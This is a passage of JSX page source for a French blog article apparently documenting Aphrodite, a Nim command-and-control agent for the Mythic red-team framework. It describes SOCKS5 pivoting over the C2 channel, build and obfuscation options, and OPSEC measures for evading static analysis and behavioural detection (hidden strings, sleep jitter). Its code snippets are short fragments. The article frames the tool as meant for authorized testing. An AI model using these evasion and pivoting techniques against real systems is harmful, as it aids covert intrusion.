        {/* 8. SOCKS5 */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <ArrowLeftRight className="size-5 text-primary" />
            8. SOCKS5
          </h2>
          <p className="text-muted-foreground mb-3">
            Aphrodite supporte le proxy SOCKS5 intégré à Mythic. Une fois
            activé avec la commande{" "}
            <code className="rounded bg-muted px-1">socks start</code>,
            l&apos;agent agit comme relais TCP : les datagrams SOCKS5 arrivent
            via le canal C2 depuis Mythic, l&apos;agent ouvre les connexions
            TCP correspondantes sur le réseau de la cible, et renvoie les
            données dans l&apos;autre sens.
          </p>
          <CodeBlock title="Activation du proxy SOCKS5">
{`// Depuis l'UI Mythic
socks start      // port par défaut Mythic
socks stop       // arrêter le proxy`}
          </CodeBlock>
          <p className="text-muted-foreground mb-3">
            L&apos;implémentation parse les requêtes CONNECT SOCKS5 (RFC 1928)
            avec support IPv4, IPv6 et noms de domaine. Mythic gère la
            négociation SOCKS5 avec le client (proxychains, navigateur…). Le
            premier datagram reçu par l&apos;agent est déjà la requête CONNECT
            parsée.
          </p>
          <CodeBlock title="proxy/socks5.nim : types d'adresses supportés">
{`case atyp
of 0x01:  # IPv4, 4 bytes addr + 2 bytes port
  let ip = $byte(data[4]) & "." & $byte(data[5]) & "." & ...
of 0x03:  # Domain name, 1 byte length + N bytes + 2 bytes port
  let host = data[5 ..< 5 + nameLen]  # résolu par getAddrInfo
of 0x04:  # IPv6, 16 bytes addr + 2 bytes port
  ...`}
          </CodeBlock>
          <p className="text-muted-foreground mb-3">
            La boucle C2 principale intègre les datagrams SOCKS de manière
            native. Ils voyagent dans les mêmes messages{" "}
            <code className="rounded bg-muted px-1">get_tasking</code> que les
            tâches normales, sous la clé{" "}
            <code className="rounded bg-muted px-1">socks</code> du JSON Mythic.
          </p>
        </section>

        {/* 9. Options de build */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Settings className="size-5 text-primary" />
            9. Options de build
          </h2>
          <p className="text-muted-foreground mb-3">
            Les options de build sont configurables dans l&apos;UI Mythic au
            moment de la génération du payload.
          </p>
          <div className="overflow-x-auto my-4">
            <table className="w-full text-sm font-mono border-collapse">
              <thead>
                <tr className="border-b border-border">
                  <th className="text-left py-2 pr-4 text-muted-foreground font-semibold">Option</th>
                  <th className="text-left py-2 pr-4 text-muted-foreground font-semibold">Type</th>
                  <th className="text-left py-2 pr-4 text-muted-foreground font-semibold">Défaut</th>
                  <th className="text-left py-2 text-muted-foreground font-semibold">Description</th>
                </tr>
              </thead>
              <tbody className="text-muted-foreground">
                {[
                  ["target_os", "Choice", "linux", "Cible : linux ou windows"],
                  ["architecture", "Choice", "amd64", "Architecture cible (amd64 uniquement)"],
                  ["debug", "Boolean", "false", "Active les logs verbeux dans l'agent (binaire plus gros)"],
                  ["static_binary", "Boolean", "false", "Link statique, aucune dépendance shared lib sur la cible"],
                  ["obfuscation", "Choice", "none", "Obfuscation des config strings : none, xor, ou aes"],
                ].map(([opt, type_, def, desc]) => (
                  <tr key={opt} className="border-b border-border/50">
                    <td className="py-2 pr-4"><code className="rounded bg-muted px-1">{opt}</code></td>
                    <td className="py-2 pr-4">{type_}</td>
                    <td className="py-2 pr-4"><code className="rounded bg-muted px-1">{def}</code></td>
                    <td className="py-2">{desc}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
          <p className="text-muted-foreground mb-3">
            En mode release (debug=false), Nim compile avec{" "}
            <code className="rounded bg-muted px-1">-d:release -d:strip</code>,
            ce qui active les optimisations et supprime les symboles de debug.
            Le flag{" "}
            <code className="rounded bg-muted px-1">--opt:size</code> est
            toujours présent pour minimiser la taille du binaire.
          </p>
          <CodeBlock title="Commande nim générée par le builder (linux, PSK, xor)">
{`nim c
  --opt:size
  --verbosity:0 --hints:off --warnings:off
  --threads:on
  -d:release -d:strip
  -d:ssl
  --out:/tmp/aphrodite_build_xxx/output/aphrodite
  /tmp/aphrodite_build_xxx/aphrodite/src/aphrodite.nim`}
          </CodeBlock>
          <p className="text-muted-foreground mb-3">
            Pour les builds Windows (cross-compile), les flags mingw sont
            ajoutés automatiquement :
          </p>
          <CodeBlock title="Flags supplémentaires pour Windows (cross-compile)">
{`--os:windows --cpu:amd64 -d:mingw
--gcc.exe:x86_64-w64-mingw32-gcc
--gcc.linkerexe:x86_64-w64-mingw32-gcc
-d:ssl -d:useWinssl`}
          </CodeBlock>
        </section>

        {/* 10. OPSEC */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Eye className="size-5 text-primary" />
            10. Considérations OPSEC
          </h2>

          <h3 className="mt-6 mb-3 font-mono text-lg font-semibold">
            Binaire natif, pas de runtime
          </h3>
          <p className="text-muted-foreground mb-3">
            Pas d&apos;interpréteur Python, pas de CLR .NET, pas de JVM. Le
            binaire Aphrodite est un ELF ou PE compilé natif. La surface de
            détection liée au runtime est nulle. Ça réduit aussi les artefacts
            système : pas de processus interpréteur visible dans la liste des
            processus.
          </p>

          <h3 className="mt-6 mb-3 font-mono text-lg font-semibold">
            strings(1) et analyse statique
          </h3>
          <p className="text-muted-foreground mb-3">
            Grâce à{" "}
            <code className="rounded bg-muted px-1">hidstr</code>, un{" "}
            <code className="rounded bg-muted px-1">strings(1)</code> sur le
            binaire ne révèle pas les noms de commandes, les clés de protocole
            Mythic, les syscalls utilisés, ni les paramètres de configuration
            (avec l&apos;option obfuscation activée). L&apos;analyse statique
            basique ne suffit pas pour comprendre le comportement de
            l&apos;agent.
          </p>

          <h3 className="mt-6 mb-3 font-mono text-lg font-semibold">
            Kill date
          </h3>
          <p className="text-muted-foreground mb-3">
            Un kill date peut être configuré au build. À chaque itération de
            la boucle C2, l&apos;agent vérifie la date courante et s&apos;arrête
            proprement si elle est dépassée. Utile pour les opérations
            time-boxed et pour s&apos;assurer qu&apos;un agent oublié ne reste
            pas actif indéfiniment.
          </p>

          <h3 className="mt-6 mb-3 font-mono text-lg font-semibold">
            Sleep et jitter
          </h3>
          <p className="text-muted-foreground mb-3">
            L&apos;intervalle de sleep et le pourcentage de jitter sont
            configurables au build et modifiables à runtime via la commande{" "}
            <code className="rounded bg-muted px-1">sleep</code>. Un jitter de
            20% sur un intervalle de 30 secondes introduit une variation
            aléatoire de ±6 secondes, suffisant pour casser les patterns de
            timing réguliers qu&apos;une détection comportementale chercherait.
          </p>
          <CodeBlock title="core/agent.nim : calcul du sleep avec jitter">
{`proc sleepWithJitter(ag: AphroditeAgent) =
  var ms = ag.state.sleepInterval * 1000
  if ag.state.jitter > 0:
    let reduction = int(float(ms) * float(ag.state.jitter) / 100.0 * rand(1.0))
    ms = max(100, ms - reduction)
  sleep(ms)`}
          </CodeBlock>

          <h3 className="mt-6 mb-3 font-mono text-lg font-semibold">
            Retry au checkin
          </h3>
          <p className="text-muted-foreground mb-3">
            Si le checkin échoue (serveur pas encore disponible, réseau
            instable), l&apos;agent réessaie jusqu&apos;à 10 fois avec un
            backoff linéaire de 5s par retry, plafonné à 60s. Après 10
            tentatives sans succès, il s&apos;arrête proprement.
          </p>
        </section>

        {/* 11. Limitations */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <AlertTriangle className="size-5 text-primary" />
            11. Limitations et TODO
          </h2>

          <h3 className="mt-6 mb-3 font-mono text-lg font-semibold">
            EKE Linux only
          </h3>
          <p className="text-muted-foreground mb-3">
            Le mode EKE nécessite OpenSSL au link et n&apos;est supporté que
            pour les cibles Linux. Les builds Windows tombent automatiquement
            en PSK. Une solution serait d&apos;utiliser une bibliothèque RSA
            pure-Nim sans dépendance OpenSSL, mais ça n&apos;est pas encore
            implémenté.
          </p>

          <h3 className="mt-6 mb-3 font-mono text-lg font-semibold">
            Cross-compile Windows
          </h3>
          <p className="text-muted-foreground mb-3">
            Les binaires Windows sont cross-compilés depuis Linux avec mingw-w64.
            Certains edge cases autour des APIs Windows peuvent se comporter
            différemment d&apos;une compilation native MSVC. À garder en tête
            si vous observez des comportements inattendus sur des versions
            spécifiques de Windows.
          </p>

          <h3 className="mt-6 mb-3 font-mono text-lg font-semibold">
            Browser scripts manquants
          </h3>
          <p className="text-muted-foreground mb-3">
            Certaines commandes retournent du texte brut alors qu&apos;elles
            bénéficieraient d&apos;une vue structurée dans l&apos;UI Mythic.
            Les browser scripts JavaScript pour{" "}
            <code className="rounded bg-muted px-1">netstat</code>,{" "}
            <code className="rounded bg-muted px-1">ifconfig</code> et{" "}
            <code className="rounded bg-muted px-1">jobs</code> ne sont pas
            encore implémentés.
          </p>

          <h3 className="mt-6 mb-3 font-mono text-lg font-semibold">
            Architecture amd64 uniquement
          </h3>
          <p className="text-muted-foreground mb-3">
            Seule l&apos;architecture amd64 est supportée pour l&apos;instant.
            Le support arm64 (Raspberry Pi, serveurs ARM) serait un ajout
            utile, notamment pour les environnements cloud.
          </p>
        </section>

        {/* Conclusion */}
        <section className="rounded-lg border border-primary/20 bg-primary/5 p-6">
          <h2 className="mb-4 font-mono text-xl font-semibold">
            Ce que j&apos;en retire
          </h2>
          <p className="text-muted-foreground mb-3">
            Aphrodite n&apos;est pas un projet one-shot qu&apos;on publie et
            qu&apos;on oublie. L&apos;objectif est d&apos;en faire un vrai
            agent maintenu, dans la lignée d&apos;Athena. Il y a déjà une
            liste de choses à ajouter : loader, support EKE sur Windows,
            browser scripts, arm64... et probablement des bugs que je
            n&apos;ai pas encore croisés. C&apos;est pour ça que je
            l&apos;ai publié plutôt que de le garder dans un coin.
          </p>
          <p className="text-muted-foreground mb-3">
            Coder Aphrodite m&apos;a surtout appris comment Mythic fonctionne
            vraiment de l&apos;intérieur : staging, checkin, dispatch des
            tasks, format des réponses, SOCKS, interactive jobs. L&apos;article
            d&apos;Athena m&apos;avait donné envie de me lancer, mais
            c&apos;est en implémentant chaque message JSON moi-même que
            j&apos;ai vraiment compris comment le framework tourne.
          </p>
          <p className="text-muted-foreground mb-3">
            Nim s&apos;est avéré un bon choix. La compilation vers du C natif
            donne un binaire propre, le cross-compile vers Windows fonctionne
            sans friction, et le système de macros permet d&apos;implémenter{" "}
            <code className="rounded bg-muted px-1">hidstr</code> de manière
            transparente. Le seul vrai point de friction reste la gestion
            d&apos;OpenSSL pour EKE, qui ne scale pas vers Windows. C&apos;est
            sur ma liste.
          </p>
          <p className="text-muted-foreground mb-3">
            Un merci à{" "}
            <a
              href="https://blog.checkymander.com/red%20team/c2/Athena/"
              target="_blank"
              rel="noopener noreferrer"
              className="text-primary underline underline-offset-4 hover:no-underline"
            >
              Scottie Austin pour Athena
            </a>{" "}
            et à{" "}
            <a
              href="https://github.com/its-a-feature/Mythic"
              target="_blank"
              rel="noopener noreferrer"
              className="text-primary underline underline-offset-4 hover:no-underline"
            >
              its-a-feature pour Mythic
            </a>
            . Sans ces deux projets, Aphrodite n&apos;existerait pas.
          </p>
          <p className="text-muted-foreground">
            Le code source est disponible sur{" "}
            <a
              href="https://github.com/0xbbuddha/aphrodite"
              target="_blank"
              rel="noopener noreferrer"
              className="text-primary underline underline-offset-4 hover:no-underline"
            >
              github.com/0xbbuddha/aphrodite
            </a>
            . Pour authorized security testing uniquement.
          </p>
        </section>
      </article>
    </div>
  );
}
